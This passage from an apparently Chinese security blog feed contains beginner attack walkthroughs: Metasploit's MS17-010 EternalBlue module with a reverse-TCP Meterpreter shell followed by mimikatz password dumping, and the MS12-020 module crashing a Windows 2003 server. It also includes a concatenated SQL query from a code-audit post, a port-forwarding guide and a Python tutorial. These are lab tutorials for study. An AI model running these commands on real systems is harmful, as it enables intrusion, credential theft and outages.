punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token variable">$f</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nx"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Np"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">Dec</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Np"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">11</span><span class="token operator">&amp;&amp;</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"****"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token string">"Nm"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$m</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$q</span><span class="token operator">=</span><span class="token function">Qry</span><span class="token punctuation">(</span><span class="token string">"Select ID,Nm,Np,Ni From "</span><span class="token punctuation">.</span><span class="token variable">$pre</span><span class="token punctuation">.</span><span class="token string">"goods Where Nh=0 And Nc="</span><span class="token punctuation">.</span><span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">"Nc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">" Order By ID Asc Limit 0,6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">Qra</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token string">"Ni"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">Dec</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token string">"Ni"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解新手如何进行内网端口转发</title>
      <link href="/posts/a2dee096.html"/>
      <url>/posts/a2dee096.html</url>
      
        <content type="html"><![CDATA[<h3 id="路由器设置"><a href="#路由器设置" class="headerlink" title="路由器设置"></a>路由器设置</h3><p>首先登录路由器的管理界面。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200411211059264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择转发规则——&gt;虚拟服务器。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200411211212890.png" alt="在这里插入图片描述"></p><p>我这里外网端口与内网端口相同，都是99，IP地址填写内网服务器的IP地址，因为是Web服务器，我这里选的协议是TCP协议。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200411211618368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>保存，到这里路由器配置就完毕了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020041121171245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="查看公网IP"><a href="#查看公网IP" class="headerlink" title="查看公网IP"></a>查看公网IP</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200411211838566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="公网访问内网Web服务器"><a href="#公网访问内网Web服务器" class="headerlink" title="公网访问内网Web服务器"></a>公网访问内网Web服务器</h3><p>这时我们在地址栏里输入我们的公网地址+转发的端口号就相当于访问了我们指定的内网地址+端口号了，<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200411212209694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解新手如何利用ms17-010配合mimikatz获取目标主机账户密码</title>
      <link href="/posts/def80e39.html"/>
      <url>/posts/def80e39.html</url>
      
        <content type="html"><![CDATA[<p><strong>第一步：使用Nmap扫描目标主机开放端口</strong><br>  要知道ms17010是对445端口进行攻击的，所以我们要先对目标机进行端口扫描</p><pre><code>nmap 192.168.48.110</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609172924493.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>第二步：获取权限</strong></p><p>在这里我们利用ms17010（永恒之蓝）漏洞来获取靶机的权限。<br>运行msf，使用ms17010漏洞。</p><pre><code>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609171519988.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来show options查看需要配置的参数</p><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609163926114.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>剩下的就是需要我们设置LHOST、RHOST、payload，分别是攻击机IP、靶机IP、攻击载荷。</p><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.48.1  //攻击机iplhost =&gt; 192.168.48.1msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.48.110  //靶机iprhost =&gt; 192.168.48.110msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp //攻击载荷payload =&gt; windows/x64/meterpreter/reverse_tcp</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609164549782.PNG" alt="在这里插入图片描述"></p><p>一切配置完毕后开始攻击</p><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </code></pre><p>这里可以看到我们已经攻击成功了，拿到了靶机的shell。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609165057669.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>拿到权限后先不要着急干别的，这里我们最好先进行进程迁移，确保我们的msf程序在目标机上不会受到干扰</strong></p><p>先使用ps命令查看进程</p><pre><code>meterpreter &gt; ps</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609170133310.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>因为我们是64位操作系统，所以我们选择迁移到64位的进程上。</p><pre><code>meterpreter &gt; migrate 516  //这里的516是PID，就是进程ID</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609170522439.PNG" alt="在这里插入图片描述"><br><strong>第三步：使用mimikatz模块获取目标机明文密码</strong></p><p>使用mimikatz模块</p><pre><code>meterpreter &gt; load mimikatz</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609170802632.PNG" alt="在这里插入图片描述"><br>获取靶机密码哈希</p><pre><code>meterpreter &gt; msv</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609170929913.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>获取靶机明文密码</p><pre><code>meterpreter &gt; kerberos </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190609171056610.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到这里攻击就结束了，成功拿到了目标机的明文账户密码。</p><p><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解新手如何使用metasploit对win2003进行蓝屏攻击</title>
      <link href="/posts/c752b67c.html"/>
      <url>/posts/c752b67c.html</url>
      
        <content type="html"><![CDATA[<p><strong>在攻击之前首先需要几个必须条件：</strong><br>1、目标机开放3389端口<br>2、目标机版本为windows2003（IIS6.0）<br>3、确保目标机与攻击机可以相互ping通</p><p><strong>攻击流程：</strong><br>一、信息收集<br>使用nmap进行扫描，查看开放的端口。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511181732309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>二、漏洞挖掘<br>首先运行MSF，查找有关MS12020的aux</p><pre><code>msf &gt; search ms12-020</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019051118313011.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有两个aux，第一个是攻击的aux，第二个是检测是否具有MS12020漏洞的aux，我们先使用第二个aux对目标机进行检测</p><pre><code>msf &gt; use auxiliary/scanner/rdp/ms12_020_check </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511192246141.PNG" alt="在这里插入图片描述"><br>接下来配置参数：</p><pre><code>msf &gt; set rhosts</code></pre><p><strong>这里的rhosts是目标机的IP地址</strong></p><p>配置完以后show options 这里已经配置完毕了</p><pre><code>msf &gt; show options</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511211514577.PNG" alt="在这里插入图片描述"></p><p>接下来exploit开始检测，这里检测出可以使用MS12020进行攻击。</p><pre><code>msf &gt; exploit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511205158867.PNG" alt="在这里插入图片描述"></p><p>三、漏洞利用<br>接下来我们就可以使用第一个aux模块进行攻击了。</p><pre><code>msf &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids //选择攻击摩模块</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511205934524.PNG" alt="在这里插入图片描述"></p><pre><code>msf &gt; set rhost 192.168.48.10 //设置目标机IP地址</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511210022855.PNG" alt="在这里插入图片描述"></p><pre><code>msf &gt; show options //检查配置参数是否正确</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511210143670.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>msf &gt; exploit //开始攻击</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511210315244.PNG" alt="在这里插入图片描述"><br>现在已经攻击成功了，我们来看一下效果如何。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511210630965.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190511211013127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没几秒服务器就挂掉了，攻击成功，这种攻击相对于DDoS来说更直接也更简单。</p><p><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的面向对象（下）</title>
      <link href="/posts/d4c5b05a.html"/>
      <url>/posts/d4c5b05a.html</url>
      
        <content type="html"><![CDATA[<h3 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h3><p>类属性创建有点类似于在类中创建一个全局变量，这个变量类跟实例都可以调用它</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义一个类属性</span>    number_of_dogs <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true"># 构造方法 - 添加实例属性，做其他初始化工作</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        <span class="token keyword">print</span> <span class="token string">'{}出生了！汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 添加一个方法bark</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，身高{}，攻击力{}，血量{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>height<span class="token punctuation">,</span>self<span class="token punctuation">.</span>power<span class="token punctuation">,</span>self<span class="token punctuation">.</span>blood<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 再添加一个attack()方法来执行攻击这个行为</span>    <span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>dog<span class="token punctuation">)</span><span class="token punctuation">:</span>        dog<span class="token punctuation">.</span>reduce_blood<span class="token punctuation">(</span>self<span class="token punctuation">.</span>power<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">reduce_blood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>reduce_value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> reduce_value <span class="token operator">></span> self<span class="token punctuation">.</span>blood<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>blood <span class="token operator">=</span> self<span class="token punctuation">.</span>blood<span class="token operator">-</span>reduce_value<span class="token comment" spellcheck="true"># 创建多个实例</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 通过类访问类属性</span><span class="token keyword">print</span> Dog<span class="token punctuation">.</span>number_of_dogs<span class="token comment" spellcheck="true"># 通过实例访问类属性</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>number_of_dogs<span class="token keyword">print</span> d2<span class="token punctuation">.</span>number_of_dogs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>唯一不同的是，在修改属性的值的时候，变量跟实例的区别是很大的</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#省略部分代码</span><span class="token comment" spellcheck="true"># 创建多个实例</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 类修改类属性</span>Dog<span class="token punctuation">.</span>number_of_dogs <span class="token operator">=</span> <span class="token number">8</span><span class="token comment" spellcheck="true"># 通过类访问类属性</span><span class="token keyword">print</span> Dog<span class="token punctuation">.</span>number_of_dogs<span class="token comment" spellcheck="true"># 实例修改类属性</span>d1<span class="token punctuation">.</span>number_of_dogs <span class="token operator">=</span> <span class="token number">10</span><span class="token comment" spellcheck="true"># 通过实例访问类属性</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>number_of_dogs<span class="token keyword">print</span> d2<span class="token punctuation">.</span>number_of_dogs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看一下运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201025224919153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>总结：</p><ol><li>整个类只有一份，所有实例都共享这一份。</li><li>可以通过类名或者实例名访问类属性，访问的都是同一个。</li><li>修改类属性需要通过类名。</li><li>因为通过实例名就会创建一个同名的实例变量。</li><li>当实例属性与类属性同名时，通过实例访问则实例属性优先。</li></ol><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><p>类方法就是定义一个属于类的方法，定义格式与实例方法相似，不过要在方法上一行加 @classmethod装饰器来声明：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dogs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 构造类方法，返回狗的数量</span>    @classmethod    <span class="token keyword">def</span> <span class="token function">number_of_dogs</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> len<span class="token punctuation">(</span>cls<span class="token punctuation">.</span>dogs<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 构造类方法，返回最高大的狗</span>    @classmethod    <span class="token keyword">def</span> <span class="token function">biggest</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>        max_height <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> cls<span class="token punctuation">.</span>dogs<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">.</span>height <span class="token operator">></span> max_height<span class="token punctuation">:</span>                max_height <span class="token operator">=</span> i<span class="token punctuation">.</span>height        <span class="token keyword">return</span> max_height    <span class="token comment" spellcheck="true"># 构造方法 - 添加实例属性，做其他初始化工作</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        <span class="token keyword">print</span> <span class="token string">'{}出生了！汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        Dog<span class="token punctuation">.</span>dogs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 